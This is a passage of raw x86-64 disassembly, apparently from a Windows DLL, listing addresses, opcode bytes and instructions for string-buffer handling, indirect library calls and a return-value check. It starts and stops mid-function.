   180005278:	48 89 45 20          	mov    %rax,0x20(%rbp)
   18000527c:	44 88 65 08          	mov    %r12b,0x8(%rbp)
   180005280:	49 3b d0             	cmp    %r8,%rdx
   180005283:	74 10                	je     0x180005295
   180005285:	4c 2b c2             	sub    %rdx,%r8
   180005288:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   18000528c:	e8 ff 39 00 00       	call   0x180008c90
   180005291:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180005295:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   180005299:	48 83 f8 10          	cmp    $0x10,%rax
   18000529d:	48 0f 43 4d 08       	cmovae 0x8(%rbp),%rcx
   1800052a2:	48 8d 55 f8          	lea    -0x8(%rbp),%rdx
   1800052a6:	ff 15 84 6d 04 00    	call   *0x46d84(%rip)        # 0x18004c030
   1800052ac:	85 c0                	test   %eax,%eax
   1800052ae:	0f 94 c3             	sete   %bl
   1800052b1:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   1800052b5:	48 83 fa 10          	cmp    $0x10,%rdx
   1800052b9:	72 31                	jb     0x1800052ec
   1800052bb:	48 ff c2             	inc    %rdx
   1800052be:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   1800052c2:	48 8b c1             	mov    %rcx,%rax
   1800052c5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800052cc:	72 19                	jb     0x1800052e7
   1800052ce:	48 83 c2 27          	add    $0x27,%rdx
   1800052d2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800052d6:	48 2b c1             	sub    %rcx,%rax
   1800052d9:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800052dd:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800052e1:	0f 87 57 07 00 00    	ja     0x180005a3e
   1800052e7:	e8 a0 75 00 00       	call   0x18000c88c
   1800052ec:	84 db                	test   %bl,%bl
   1800052ee:	0f 84 a0 06 00 00    	je     0x180005994
   1800052f4:	4c 89 6d 68          	mov    %r13,0x68(%rbp)
   1800052f8:	4c 89 6d 78          	mov    %r13,0x78(%rbp)
   1800052fc:	48 c7 85 80 00 00 00 	movq   $0xf,0x80(%rbp)
   180005303:	0f 00 00 00 
   180005307:	c6 45 68 00          	movb   $0x0,0x68(%rbp)
   18000530b:	41 b8 4f 00 00 00    	mov    $0x4f,%r8d
   180005311:	48 8d 15 88 db 03 00 	lea    0x3db88(%rip),%rdx        # 0x180042ea0
   180005318:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   18000531c:	e8 6f 39 00 00       	call   0x180008c90
   180005321:	90                   	nop
   180005322:	48 8d 55 68          	lea    0x68(%rbp),%rdx
   180005326:	48 83 bd 80 00 00 00 	cmpq   $0x10,0x80(%rbp)
   18000532d:	10 
   18000532e:	48 0f 43 55 68       	cmovae 0x68(%rbp),%rdx
   180005333:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180005338:	4c 8d 4d f0          	lea    -0x10(%rbp),%r9
   18000533c:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180005343:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   180005347:	ff 15 03 6d 04 00    	call   *0x46d03(%rip)        # 0x18004c050
   18000534d:	85 c0                	test   %eax,%eax
   18000534f:	0f 85 27 06 00 00    	jne    0x18000597c
   180005355:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   180005359:	ff 15 e1 6c 04 00    	call   *0x46ce1(%rip)        # 0x18004c040
   18000535f:	83 f8 64             	cmp    $0x64,%eax
   180005362:	0f 85 7c 05 00 00    	jne    0x1800058e4
   180005368:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   18000536d:	4c 8d 3d 5f d7 03 00 	lea    0x3d75f(%rip),%r15        # 0x180042ad3
   180005374:	41 83 fe 01          	cmp    $0x1,%r14d
   180005378:	7e 28                	jle    0x1800053a2
   18000537a:	49 63 ce             	movslq %r14d,%rcx
   18000537d:	b8 20 00 00 00       	mov    $0x20,%eax
   180005382:	48 f7 e1             	mul    %rcx
   180005385:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   18000538c:	49 0f 40 c6          	cmovo  %r14,%rax
   180005390:	48 8b d0             	mov    %rax,%rdx
   180005393:	48 8b ce             	mov    %rsi,%rcx
   180005396:	e8 fd 24 01 00       	call   0x180017898
   18000539b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800053a0:	eb 07                	jmp    0x1800053a9
   1800053a2:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   1800053a9:	4c 89 6d 08          	mov    %r13,0x8(%rbp)
   1800053ad:	4c 89 6d 18          	mov    %r13,0x18(%rbp)
   1800053b1:	48 c7 45 20 0f 00 00 	movq   $0xf,0x20(%rbp)
   1800053b8:	00 
   1800053b9:	c6 45 08 00          	movb   $0x0,0x8(%rbp)
   1800053bd:	4c 89 ad 88 00 00 00 	mov    %r13,0x88(%rbp)
